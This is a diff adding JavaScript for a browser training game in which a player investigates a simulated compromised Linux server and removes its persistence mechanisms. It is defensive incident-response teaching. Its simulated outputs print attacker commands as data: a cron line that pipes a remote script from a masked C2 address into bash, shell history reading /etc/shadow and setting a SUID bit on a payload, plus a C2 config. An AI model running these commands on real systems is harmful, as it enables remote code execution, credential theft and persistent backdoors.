+            printLine('[!] PID 2201: update-helper is a backdoored binary.', 'warning');
+            break;
+
+        case 'root-dir':
+            printLine('total 32', 'system');
+            printLine('-rw-r--r--  root root  .bashrc', 'info');
+            printLine('-rw-r--r--  root root  .bash_history', 'info');
+            printLine('-rw-r--r--  root root  notes.txt', 'info');
+            printLine('drwx------  root root  .ssh/', 'info');
+            printLine('drwxr-xr-x  root root  scripts/', 'info');
+            printLine('', 'system');
+            printLine('Hint: cat notes.txt or cat .bash_history for root activity.', 'system');
+            break;
+
+        default:
+            printLine('ls: not at a named directory.', 'error');
+            printLine('Navigate to a directory node and run ls again.', 'system');
+    }
+
+    printLine('', 'system');
+}
+
+function cmdCat(args) {
+    if (!args.length) {
+        printLine('Usage: cat <filename>', 'error');
+        return;
+    }
+
+    var file = args.join(' ').toLowerCase();
+    var node = currentNodeType();
+
+    printLine('', 'system');
+
+    // Context-sensitive cat based on current directory node
+    if (node === 'etc-cron') {
+        if (file === '.data-sync' || file === 'data-sync') {
+            printLine('cat /etc/cron.d/.data-sync', 'heading');
+            printLine('# System data synchronization', 'system');
+            printLine('# Last modified: Mar 04 03:16', 'system');
+            printLine('*/5 * * * * root curl -s http://185.203.xx.xx/c | bash', 'warning');
+            printLine('', 'system');
+            printLine('[!] MALICIOUS: Cron job downloads and executes remote script every 5 minutes.', 'warning');
+            printLine('[!] C2 address: 185.203.xx.xx — same as attacker SSH origin.', 'warning');
+            if (!STATE.maliciousCronFound) {
+                STATE.maliciousCronFound = true;
+                checkObjectives();
+            }
+        } else if (file === 'system-update') {
+            printLine('cat /etc/cron.d/system-update', 'heading');
+            printLine('# System package updates', 'system');
+            printLine('0 3 * * 0 root /usr/bin/apt-get -y update && /usr/bin/apt-get -y upgrade', 'info');
+            printLine('', 'system');
+            printLine('Legitimate cron job. No issues found.', 'info');
+        } else if (file === 'logrotate') {
+            printLine('cat /etc/cron.d/logrotate', 'heading');
+            printLine('*/10 * * * * root /usr/sbin/logrotate /etc/logrotate.conf', 'info');
+            printLine('', 'system');
+            printLine('Legitimate cron job. No issues found.', 'info');
+        } else {
+            printLine('cat: /etc/cron.d/' + args.join(' ') + ': No such file or directory', 'error');
+        }
+    } else if (node === 'var-log') {
+        if (file === 'auth.log') {
+            printLine('cat /var/log/auth.log (tail -30)', 'heading');
+            printLine('Mar 03 22:14:01 srv-web01 sshd: Failed password for admin from 10.0.0.5 port 44231', 'info');
+            printLine('Mar 03 22:14:03 srv-web01 sshd: Failed password for admin from 10.0.0.5 port 44232', 'info');
+            printLine('Mar 04 03:14:20 srv-web01 sshd: Accepted publickey for admin from 185.203.xx.xx port 51234', 'warning');
+            printLine('Mar 04 03:14:22 srv-web01 sshd: pam_unix(sshd:session): session opened for user admin', 'warning');
+            printLine('Mar 04 03:14:25 srv-web01 sudo: admin : TTY=pts/0 ; COMMAND=/bin/bash', 'warning');
+            printLine('Mar 04 03:15:01 srv-web01 sudo: admin : TTY=pts/0 ; COMMAND=/usr/sbin/useradd backdoor', 'warning');
+            printLine('Mar 04 03:16:12 srv-web01 sshd: Disconnected from 185.203.xx.xx port 51234', 'warning');
+            printLine('', 'system');
+            printLine('[!] Attacker IP identified: 185.203.xx.xx', 'success');
+            printLine('[!] SSH login via publickey at 03:14 — rogue authorized key used.', 'warning');
+            printLine('[!] Escalated to root via sudo /bin/bash.', 'warning');
+            printLine('[!] New user "backdoor" created at 03:15.', 'warning');
+            if (!STATE.attackerIPFound) {
+                STATE.attackerIPFound = true;
+                checkObjectives();
+            }
+        } else if (file === 'syslog') {
+            printLine('cat /var/log/syslog (tail -20)', 'heading');
+            printLine('Mar 04 03:16:14 srv-web01 cron[1024]: (root) CMD (/tmp/.cache/.payload.elf --daemon)', 'warning');
+            printLine('Mar 04 03:16:15 srv-web01 kernel: [12345.678] segfault at 0 ip 0000... error 4', 'info');
+            printLine('Mar 04 03:20:01 srv-web01 cron[1024]: (root) CMD (curl -s http://185.203.xx.xx/c | bash)', 'warning');
+            printLine('Mar 04 03:25:01 srv-web01 cron[1024]: (root) CMD (curl -s http://185.203.xx.xx/c | bash)', 'warning');
+            printLine('', 'system');
+            printLine('[!] Malicious cron executing every 5 minutes. C2: 185.203.xx.xx', 'warning');
+        } else {
+            printLine('cat: /var/log/' + args.join(' ') + ': No such file or permission denied', 'error');
+        }
+    } else if (node === 'home-admin') {
+        if (file === '.bash_history') {
+            printLine('cat /home/admin/.bash_history', 'heading');
+            printLine('sudo apt-get update', 'info');
+            printLine('ls /var/www/html', 'info');
+            printLine('ssh 192.168.1.10', 'info');
+            printLine('cat /etc/passwd', 'info');
+            printLine('# The following lines added Mar 04 03:14 (attacker session)', 'warning');
+            printLine('sudo /bin/bash', 'warning');
+            printLine('cp /tmp/.cache/.payload.elf /usr/sbin/update-helper', 'warning');
+            printLine('chmod u+s /usr/sbin/update-helper', 'warning');
+            printLine('echo "*/5 * * * * root curl -s http://185.203.xx.xx/c | bash" > /etc/cron.d/.data-sync', 'warning');
+            printLine('cat ~/.ssh/authorized_keys', 'warning');
+        } else if (file === '.bashrc') {
+            printLine('cat /home/admin/.bashrc', 'heading');
+            printLine('# ~/.bashrc: executed by bash(1) for non-login shells.', 'info');
+            printLine('alias ll="ls -la"', 'info');
+            printLine('export PATH="$HOME/bin:$PATH"', 'info');
+            printLine('', 'system');
+            printLine('No issues found in .bashrc.', 'info');
+        } else {
+            printLine('cat: /home/admin/' + args.join(' ') + ': No such file or permission denied', 'error');
+        }
+    } else if (node === 'ssh-config') {
+        if (file === 'authorized_keys') {
+            printLine('cat /etc/ssh/authorized_keys', 'heading');
+            printLine('ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7V...8kL admin@workstation', 'info');
+            printLine('ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQDf...2Rx backdoor@185.203.xx.xx  <- [SUSPICIOUS]', 'warning');
+            printLine('', 'system');
+            printLine('[!] ROGUE KEY DETECTED: backdoor@185.203.xx.xx', 'warning');
+            printLine('[!] This key granted the attacker passwordless SSH access.', 'warning');
+            printLine('Hint: use "remove backdoor" to purge the unauthorized key.', 'system');
+        } else if (file === 'sshd_config') {
+            printLine('cat /etc/ssh/sshd_config', 'heading');
+            printLine('Port 22', 'info');
+            printLine('PermitRootLogin no', 'info');
+            printLine('PubkeyAuthentication yes', 'info');
+            printLine('AuthorizedKeysFile /etc/ssh/authorized_keys', 'info');
+            printLine('PasswordAuthentication no', 'info');
+            printLine('', 'system');
+            printLine('[!] AuthorizedKeysFile points to /etc/ssh/authorized_keys — check that file.', 'warning');
+        } else {
+            printLine('cat: /etc/ssh/' + args.join(' ') + ': No such file or permission denied', 'error');
+        }
+    } else if (node === 'tmp-hidden') {
+        if (file === '.config.dat') {
+            printLine('cat /tmp/.cache/.config.dat', 'heading');
+            printLine('c2_host=185.203.xx.xx', 'warning');
+            printLine('c2_port=4444', 'warning');
+            printLine('interval=300', 'warning');
+            printLine('payload_url=http://185.203.xx.xx/c', 'warning');
+            printLine('install_path=/usr/sbin/update-helper', 'warning');
+            printLine('persist=cron', 'warning');
+            printLine('', 'system');
+            printLine('[!] C2 configuration file. Attacker C2: 185.203.xx.xx:4444', 'warning');
+        } else if (file === '.pid') {
+            printLine('cat /tmp/.cache/.pid', 'heading');
+            printLine('1337', 'warning');
+            printLine('', 'system');
+            printLine('[!] PID 1337 — the malicious payload daemon is running.', 'warning');
+        } else {
+            printLine('cat: /tmp/.cache/' + args.join(' ') + ': Permission denied or no such file', 'error');
+        }
+    } else if (node === 'root-dir') {
+        if (file === 'notes.txt') {
+            printLine('cat /root/notes.txt', 'heading');
+            printLine('Server hardening checklist (pre-incident):', 'info');
+            printLine('  [x] Disable password auth', 'info');
+            printLine('  [x] Enable firewall', 'info');
+            printLine('  [ ] Review authorized_keys — PENDING', 'info');
+            printLine('  [ ] Audit cron jobs       — PENDING', 'info');
+            printLine('  [ ] Check SUID binaries   — PENDING', 'info');
+            printLine('', 'system');
+            printLine('All three pending items correspond to active threats.', 'warning');
+        } else if (file === '.bash_history') {
+            printLine('cat /root/.bash_history', 'heading');
+            printLine('# Attacker activity Mar 04 03:14-03:16', 'warning');
+            printLine('id && whoami', 'warning');
+            printLine('cat /etc/shadow', 'warning');
+            printLine('cp /tmp/p.elf /tmp/.cache/.payload.elf', 'warning');
+            printLine('chmod +x /tmp/.cache/.payload.elf', 'warning');
+            printLine('nohup /tmp/.cache/.payload.elf --daemon &', 'warning');
+            printLine('cp /tmp/.cache/.payload.elf /usr/sbin/update-helper', 'warning');
+            printLine('chmod u+s /usr/sbin/update-helper', 'warning');
+        } else {
+            printLine('cat: /root/' + args.join(' ') + ': No such file or permission denied', 'error');
+        }
+    } else if (node === 'usr-sbin') {
+        printLine('cat: use "find" to enumerate binaries, or "ls" to list directory.', 'warning');
+    } else if (node === 'empty' || node === 'wall') {
+        printLine('cat: not in a valid directory. Navigate to a directory node first.', 'error');
+    } else {
+        printLine('cat: file not found or permission denied.', 'error');
+    }
+
+    printLine('', 'system');
+    saveState();
+}
+
+function cmdFind() {
+    var node = currentNodeType();
+    printLine('', 'system');
+
+    if (node === 'usr-sbin') {
+        printLine('find /usr/sbin -perm /4000 -type f', 'heading');
+        printLine('Finding SUID binaries...', 'system');
+        printLine('', 'system');
+        printLine('-rwsr-xr-x  root  /usr/sbin/adduser', 'info');
+        printLine('-rwsr-xr-x  root  /usr/sbin/passwd', 'info');
+        printLine('-rwsr-xr-x  root  /usr/sbin/sudo', 'info');
+        printLine('-rwsr-xr-x  root  /usr/sbin/update-helper    <- [SUSPICIOUS]', 'warning');
+        printLine('', 'system');
+        printLine('[!] SUSPICIOUS: /usr/sbin/update-helper', 'warning');
+        printLine('[!] Not a standard system SUID binary.', 'warning');
+        printLine('[!] File modified: Mar 04 03:16 (during attacker session)', 'warning');
+        printLine('[!] This is a backdoored binary placed by the attacker.', 'warning');
+
+        if (!STATE.suidBackdoorFound) {
+            STATE.suidBackdoorFound = true;
+            checkObjectives();
+        }
+    } else if (node === 'tmp-hidden') {
+        printLine('find /tmp -type f', 'heading');
+        printLine('-rwxr-xr-x  root  /tmp/.cache/.payload.elf', 'warning');
+        printLine('-rw-r--r--  root  /tmp/.cache/.config.dat', 'warning');
+        printLine('-rw-r--r--  root  /tmp/.cache/.pid', 'warning');
+        printLine('', 'system');
+        printLine('[!] Malicious artifacts in /tmp/.cache/ — attacker staging directory.', 'warning');
+    } else if (node === 'etc-cron') {
+        printLine('find /etc/cron.d -type f', 'heading');
+        printLine('-rw-r--r--  root  /etc/cron.d/apt-daily', 'info');
+        printLine('-rw-r--r--  root  /etc/cron.d/logrotate', 'info');
+        printLine('-rw-r--r--  root  /etc/cron.d/system-update', 'info');
+        printLine('-rw-r--r--  root  /etc/cron.d/.data-sync    <- [SUSPICIOUS]', 'warning');
+        printLine('', 'system');
+        printLine('[!] .data-sync is hidden (dot-prefixed). Investigate with cat .data-sync.', 'warning');
+    } else {
+        printLine('find: searching ' + (CELL_INFO[node] ? CELL_INFO[node].label : 'current location') + '...', 'system');
+        printLine('No suspicious files found in this directory.', 'info');
+        printLine('', 'system');
+        printLine('Tip: find is most effective in /USR/SBIN for SUID binary enumeration.', 'system');
+    }
+
+    printLine('', 'system');
+    saveState();
+}
+
+function cmdGrep(args) {
+    if (!args.length) {
+        printLine('Usage: grep <pattern>', 'error');
+        printLine('Example: grep 185, grep failed, grep sudo', 'system');
+        return;
+    }
+
+    var pattern = args.join(' ').toLowerCase();
+    var node = currentNodeType();
+
+    printLine('', 'system');
+
+    if (node === 'var-log') {
+        // Pattern-matched grep results against auth.log content
+        if (pattern === '185' || pattern.indexOf('185.203') !== -1) {
+            printLine('grep "185" /var/log/auth.log', 'heading');
+            printLine('Mar 04 03:14:20 srv-web01 sshd: Accepted publickey for admin from 185.203.xx.xx port 51234', 'warning');
+            printLine('Mar 04 03:14:22 srv-web01 sshd: session opened for user admin from 185.203.xx.xx', 'warning');
+            printLine('Mar 04 03:16:12 srv-web01 sshd: Disconnected from 185.203.xx.xx port 51234', 'warning');
+            printLine('', 'system');
+            printLine('[!] Attacker IP: 185.203.xx.xx — SSH login confirmed at 03:14.', 'success');
+            if (!STATE.attackerIPFound) {
+                STATE.attackerIPFound = true;
+                checkObjectives();
+            }
+        } else if (pattern === 'failed' || pattern === 'failure') {
+            printLine('grep -i "failed" /var/log/auth.log', 'heading');
+            printLine('Mar 03 22:14:01 srv-web01 sshd: Failed password for admin from 10.0.0.5 port 44231', 'info');
+            printLine('Mar 03 22:14:03 srv-web01 sshd: Failed password for admin from 10.0.0.5 port 44232', 'info');
+            printLine('Mar 03 22:14:05 srv-web01 sshd: Failed password for admin from 10.0.0.5 port 44233', 'info');
+            printLine('Mar 03 22:14:09 srv-web01 sshd: Failed password for invalid user root from 10.0.0.5', 'info');
+            printLine('', 'system');
+            printLine('4 failed login attempts from 10.0.0.5 (internal). Attacker used publickey for final access.', 'info');
+        } else if (pattern === 'sudo') {
+            printLine('grep "sudo" /var/log/auth.log', 'heading');
+            printLine('Mar 04 03:14:25 srv-web01 sudo: admin : TTY=pts/0 ; COMMAND=/bin/bash', 'warning');
+            printLine('Mar 04 03:15:01 srv-web01 sudo: admin : TTY=pts/0 ; COMMAND=/usr/sbin/useradd backdoor', 'warning');
+            printLine('', 'system');
+            printLine('[!] Attacker used sudo to escalate to root and created backdoor user.', 'warning');
+        } else if (pattern === 'publickey' || pattern === 'accepted') {
+            printLine('grep -i "accepted" /var/log/auth.log', 'heading');
+            printLine('Mar 04 03:14:20 srv-web01 sshd: Accepted publickey for admin from 185.203.xx.xx port 51234', 'warning');
+            printLine('', 'system');
+            printLine('[!] Attacker authenticated via rogue public key from 185.203.xx.xx.', 'warning');
+            if (!STATE.attackerIPFound) {
+                STATE.attackerIPFound = true;
+                checkObjectives();
+            }
+        } else {
+            printLine('grep "' + args.join(' ') + '" /var/log/auth.log', 'heading');
+            printLine('(no matches found)', 'system');
+            printLine('', 'system');
+            printLine('Try: grep 185, grep failed, grep sudo, grep accepted', 'info');
+        }
+    } else {
+        printLine('grep is most effective in /VAR/LOG.', 'warning');
+        printLine('Navigate to /VAR/LOG and run grep again.', 'system');
+    }
+
+    printLine('', 'system');
+    saveState();
+}
+
+function cmdCrontab(args) {
+    var node = currentNodeType();
+
+    if (node !== 'etc-cron') {
+        printLine('crontab: must be in /ETC/CRON.D directory.', 'error');
+        printLine('Navigate to /ETC/CRON.D and run crontab again.', 'system');
+        return;
+    }
+
+    var flag = args.length ? args[0].toLowerCase() : '';
+    printLine('', 'system');
+
+    if (flag === '-l' || flag === '') {
+        printLine('crontab -l (system cron jobs in /etc/cron.d)', 'heading');
+        printLine('', 'system');
+        printLine('--- /etc/cron.d/system-update ---', 'system');
+        printLine('0 3 * * 0 root /usr/bin/apt-get -y update', 'info');
+        printLine('', 'system');
+        printLine('--- /etc/cron.d/logrotate ---', 'system');
+        printLine('*/10 * * * * root /usr/sbin/logrotate /etc/logrotate.conf', 'info');
+        printLine('', 'system');
+        printLine('--- /etc/cron.d/.data-sync ---', 'system');
+        printLine('*/5 * * * * root curl -s http://185.203.xx.xx/c | bash', 'warning');
+        printLine('', 'system');
+        printLine('[!] MALICIOUS: .data-sync — C2 beacon executes every 5 minutes.', 'warning');
+        if (!STATE.maliciousCronFound) {
+            STATE.maliciousCronFound = true;
+            checkObjectives();
+        }
+    } else if (flag === '-r') {
+        if (!STATE.maliciousCronFound) {
+            // Still counts as found if they -r without -l first
+            STATE.maliciousCronFound = true;
+            checkObjectives();
+        }
+        printLine('Removing malicious cron job /etc/cron.d/.data-sync...', 'system');
+        printLine('rm /etc/cron.d/.data-sync', 'info');
+        printLine('Done. C2 download cron removed.', 'success');
+        printLine('', 'system');
+        printLine('Remaining scheduled jobs are legitimate.', 'info');
+    } else {
+        printLine('crontab: unknown option: ' + args.join(' '), 'error');
+        printLine('Usage: crontab -l (list) | crontab -r (remove malicious entry)', 'system');
+    }
+
+    printLine('', 'system');
+    saveState();
+}
+
+function cmdRemove(args) {
+    var node = currentNodeType();
+
+    if (node !== 'ssh-config') {
+        printLine('remove: must be in /ETC/SSH directory.', 'error');
+        printLine('Navigate to /ETC/SSH and target the rogue authorized key.', 'system');
+        return;
+    }
+
+    if (!args.length) {
+        printLine('Usage: remove <target>', 'error');
+        printLine('Example: remove backdoor', 'system');
+        return;
+    }
+
+    var target = args.join(' ').toLowerCase();
+    printLine('', 'system');
+
+    if (target === 'backdoor' || target === 'key' || target === 'rogue' || target.indexOf('185') !== -1 || target === 'authorized_keys') {
+        if (STATE.sshKeyRemoved) {
+            printLine('Rogue SSH key has already been removed.', 'success');
+        } else {
+            printLine('Removing rogue authorized key from /etc/ssh/authorized_keys...', 'system');
+            printLine('', 'system');
+            printLine('Identified:  ssh-rsa AAAA...2Rx backdoor@185.203.xx.xx', 'warning');
+            printLine('Action:      sed -i \'/backdoor@185.203/d\' /etc/ssh/authorized_keys', 'system');
+            printLine('', 'system');
+            printLine('Key removed. Restarting sshd to enforce new key list...', 'system');
+            printLine('sshd restarted. Unauthorized key can no longer be used for auth.', 'success');
+            printLine('', 'system');
+            printLine('[!] Remaining authorized keys: 1 (admin@workstation — legitimate)', 'info');
+            STATE.sshKeyRemoved = true;
+            checkObjectives();
+        }
+    } else {
+        printLine('remove: unknown target: ' + args.join(' '), 'error');
+        printLine('Try: remove backdoor (to remove the rogue SSH key)', 'system');
+    }
+
+    printLine('', 'system');
+    saveState();
+}
+
+function cmdStatus() {
+    var col = STATE.position.col;
+    var row = STATE.position.row;
+    var cellType = GRID_MAP[row][col];
+    var posLabel = (cellType !== 'empty' && cellType !== 'wall') ? CELL_INFO[cellType].label : 'Filesystem path';
+
+    printLine('', 'system');
+    printLine('\u2550\u2550\u2550 INVESTIGATION STATUS \u2550\u2550\u2550', 'heading');
+    printLine('Position:      (' + col + ',' + row + ') \u2014 ' + posLabel, 'info');
+    printLine('Dirs mapped:   ' + STATE.nodesDiscovered.size + ' / 8', 'info');
+    printLine('Commands used: ' + STATE.commandCount, 'info');
+    printLine('', 'system');
+    printLine('FINDINGS:', 'heading');
+    printLine('  Malicious cron found:  ' + (STATE.maliciousCronFound ? 'YES — .data-sync in /etc/cron.d' : 'NO — check /ETC/CRON.D'), STATE.maliciousCronFound ? 'success' : 'warning');
+    printLine('  Attacker IP found:     ' + (STATE.attackerIPFound ? 'YES — 185.203.xx.xx' : 'NO — check /VAR/LOG auth.log'), STATE.attackerIPFound ? 'success' : 'warning');
+    printLine('  SSH key removed:       ' + (STATE.sshKeyRemoved ? 'YES — rogue key purged' : 'NO — check /ETC/SSH authorized_keys'), STATE.sshKeyRemoved ? 'success' : 'warning');
+    printLine('  SUID backdoor found:   ' + (STATE.suidBackdoorFound ? 'YES — /usr/sbin/update-helper' : 'NO — run find in /USR/SBIN'), STATE.suidBackdoorFound ? 'success' : 'warning');
+    printLine('', 'system');
+    printLine('Objectives:', 'heading');
+
+    var objText = [
+        'Find malicious cron job',
+        'Identify attacker IP address',
+        'Remove rogue SSH key',
+        'Find SUID backdoor binary'
+    ];
+
+    STATE.objectives.forEach(function(done, i) {
+        printLine((done ? ' [X] ' : ' [ ] ') + objText[i], done ? 'success' : 'system');
+    });
+}
+
+// ═══ Utility ═══
+
+function padRight(str, len) {
+    while (str.length < len) str += ' ';
+    return str;
+}
+
+// ═══ Objectives ═══
+
+function checkObjectives() {
+    var prev = STATE.objectives.slice();
+
+    STATE.objectives[0] = STATE.maliciousCronFound;
+    STATE.objectives[1] = STATE.attackerIPFound;
+    STATE.objectives[2] = STATE.sshKeyRemoved;
+    STATE.objectives[3] = STATE.suidBackdoorFound;
+
+    // Announce newly completed objectives
+    STATE.objectives.forEach(function(done, i) {
+        if (done && !prev[i]) {
+            printLine('', 'system');
+            printLine('[OBJECTIVE COMPLETE] ' + OBJ_LABELS[i], 'success');
+        }
+    });
+
+    updateObjectivesUI();
+
+    // All complete?
+    if (STATE.objectives.every(Boolean) && !STATE.completed) {
+        STATE.completed = true;
+        var elapsed = Math.floor((Date.now() - STATE.startTime) / 1000);
+
+        // Write completion record to localStorage
+        var stats = {
+            completed: true,
+            time: elapsed,
+            commands: STATE.commandCount,
+            nodesDiscovered: STATE.nodesDiscovered.size,
+            timestamp: Date.now()
+        };
+        try {
+            localStorage.setItem('hexworth_operator_linuxfs02', JSON.stringify(stats));
+            localStorage.removeItem('hexworth_operator_linuxfs02_save');
+        } catch (e) {}
+
+        printLine('', 'system');
+        printLine('\u2550\u2550\u2550 ALL OBJECTIVES COMPLETE \u2550\u2550\u2550', 'heading');
+        printLine('Mission LINUX-FS-02 accomplished. Persistence mechanisms cleared.', 'success');
+
+        document.getElementById('header-status').textContent = 'COMPLETE';
+        document.getElementById('header-status').style.color = '#39ff14';
+
+        setTimeout(function() { showMissionComplete(elapsed); }, 1500);
+    }
+}
+
+function updateObjectivesUI() {
+    STATE.objectives.forEach(function(done, i) {
+        var el = document.getElementById('obj-' + i);
+        if (!el) return;
+        var check = el.querySelector('.obj-check');
+        if (done) {
+            el.classList.add('complete');
+            check.textContent = '\u2713';
+        } else {
+            el.classList.remove('complete');
+            check.textContent = '';
+        }
+    });
+}
+
+function showMissionComplete(elapsed) {
+    var mins = Math.floor(elapsed / 60);
+    var secs = elapsed % 60;
+    var timeStr = mins > 0 ? mins + 'm ' + secs + 's' : secs + 's';
+
+    document.getElementById('stat-nodes').textContent = STATE.nodesDiscovered.size;
+    document.getElementById('stat-commands').textContent = STATE.commandCount;
+    document.getElementById('stat-time').textContent = timeStr;
+
+    document.getElementById('mission-complete').classList.add('visible');
+}
+
+// ═══ Save / Load ═══
+
+function saveState() {
+    try {
+        var data = {
+            position: STATE.position,
+            visibility: STATE.visibility,
+            objectives: STATE.objectives,
+            nodesDiscovered: Array.from(STATE.nodesDiscovered),
+            commandCount: STATE.commandCount,
+            startTime: STATE.startTime,
+            maliciousCronFound: STATE.maliciousCronFound,
+            attackerIPFound: STATE.attackerIPFound,
+            sshKeyRemoved: STATE.sshKeyRemoved,
+            suidBackdoorFound: STATE.suidBackdoorFound
+        };
+        localStorage.setItem('hexworth_operator_linuxfs02_save', JSON.stringify(data));
+    } catch (e) {}
+}
+
+function loadState() {
+    try {
+        var saved = localStorage.getItem('hexworth_operator_linuxfs02_save');
+        if (!saved) return false;
+        var data = JSON.parse(saved);
+        STATE.position = data.position;
+        STATE.visibility = data.visibility;
+        STATE.objectives = data.objectives;
+        STATE.nodesDiscovered = new Set(data.nodesDiscovered);
+        STATE.commandCount = data.commandCount;
+        STATE.startTime = data.startTime;
+        STATE.maliciousCronFound = data.maliciousCronFound || false;
+        STATE.attackerIPFound = data.attackerIPFound || false;
+        STATE.sshKeyRemoved = data.sshKeyRemoved || false;
+        STATE.suidBackdoorFound = data.suidBackdoorFound || false;
+        return true;
+    } catch (e) {
+        return false;
+    }
+}
+
+function resetState() {
+    STATE = {
+        position: { col: 0, row: 0 },
+        visibility: {},
+        objectives: [false, false, false, false],
+        nodesDiscovered: new Set(),
+        commandCount: 0,
+        commandHistory: [],
+        historyIndex: -1,
+        startTime: Date.now(),
+        completed: false,
+        maliciousCronFound: false,
+        attackerIPFound: false,
+        sshKeyRemoved: false,
+        suidBackdoorFound: false
+    };
+    // Starting cell — etc-cron at (0,0)
+    STATE.visibility['0,0'] = 'visited';
+    STATE.nodesDiscovered.add('etc-cron');
+    revealAdjacent(0, 0);
+}
+
+// ═══ Command Parser ═══
+
+function executeCommand(input) {
+    STATE.commandCount++;
+
+    // Echo prompt
+    printLine('analyst@linux:~$ ' + input, 'prompt-echo');
+
+    var parts = input.trim().split(/\s+/);
+    var cmd = parts[0].toLowerCase();
+    var args = parts.slice(1);
+
+    switch (cmd) {
+        case 'scan':     cmdScan(); break;
+        case 'move':     cmdMove(args); break;
+        case 'ls':       cmdLs(); break;
+        case 'cat':      cmdCat(args); break;
+        case 'find':     cmdFind(); break;
+        case 'grep':     cmdGrep(args); break;
+        case 'crontab':  cmdCrontab(args); break;
+        case 'remove':   cmdRemove(args); break;
+        case 'status':   cmdStatus(); break;
+        case 'help':     cmdHelp(); break;
+        case 'clear':
+            document.getElementById('term-output').innerHTML = '';
+            break;
+        // Accept chmod as flavor (no objective effect, just output)
+        case 'chmod':
+            var node = currentNodeType();
+            if (node === 'usr-sbin') {
+                printLine('chmod ' + args.join(' ') + ' /usr/sbin/update-helper', 'info');
+                printLine('SUID bit removed. Binary no longer runs as root.', 'success');
+                printLine('Note: use "find" to identify SUID binaries as the primary objective.', 'system');
+            } else {
+                printLine('chmod ' + args.join(' ') + ': permission denied or not applicable here.', 'error');
+            }
+            break;
+        default:
+            printLine('Unknown command: ' + cmd, 'error');
+            printLine('Type "help" for available commands.', 'system');
+    }
+}
+
+// ═══ Terminal Input ═══
+
+function setupInput() {
+    var input = document.getElementById('term-input');
+
+    input.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            var cmd = this.value.trim();
+            if (cmd) {
+                STATE.commandHistory.push(cmd);
+                STATE.historyIndex = STATE.commandHistory.length;
+                executeCommand(cmd);
+            }
+            this.value = '';
+        } else if (e.key === 'ArrowUp') {
+            e.preventDefault();
+            if (STATE.historyIndex > 0) {
+                STATE.historyIndex--;
+                this.value = STATE.commandHistory[STATE.historyIndex];
+            }
+        } else if (e.key === 'ArrowDown') {
+            e.preventDefault();
+            if (STATE.historyIndex < STATE.commandHistory.length - 1) {
+                STATE.historyIndex++;
+                this.value = STATE.commandHistory[STATE.historyIndex];
+            } else {
+                STATE.historyIndex = STATE.commandHistory.length;
+                this.value = '';
+            }
+        }
+    });
+
+    // Click terminal area to focus input
+    document.getElementById('term-panel').addEventListener('click', function(e) {
+        if (e.target.tagName !== 'INPUT') input.focus();
+    });
+}
+
+// ═══ Mission Briefing ═══
+
+function showBriefing() {
+    printLine('\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557', 'heading');
+    printLine('\u2551  MISSION: LINUX-FS-02 \u2014 ROOT HUNT         \u2551', 'heading');
+    printLine('\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563', 'heading');
+    printLine('\u2551  Compromised Linux server detected.         \u2551', 'heading');
+    printLine('\u2551  Persistence mechanisms active: cron        \u2551', 'heading');
+    printLine('\u2551  backdoors, SUID binaries, rogue SSH keys.  \u2551', 'heading');
+    printLine('\u2551  Hunt them down. Identify the attacker.     \u2551', 'heading');
+    printLine('\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D', 'heading');
+    printLine('', 'system');
+    printLine('[SYS] Analyst connected to srv-web01', 'success');
+    printLine('[SYS] Entry point: /etc/cron.d — anomaly detected', 'warning');
+    printLine('[SYS] Type "help" for command reference', 'info');
+    printLine('[SYS] Type "ls" to list directory contents', 'info');
+    printLine('', 'system');
+}
+
+// ═══ Init ═══
+
+function init() {
+    buildGrid();
+    setupInput();
+
+    var restored = loadState();
+    if (restored && !STATE.completed) {
+        printLine('[SYS] Session restored from save.', 'system');
+        printLine('[SYS] Type "status" to review investigation findings.', 'info');
+        printLine('', 'system');
+    } else {
+        resetState();
+        showBriefing();
+    }
+
+    updateGrid();
+    updateObjectivesUI();
+    document.getElementById('term-input').focus();
+}
+
+document.addEventListener('DOMContentLoaded', init);
+</script>
+
+</body>
+</html>
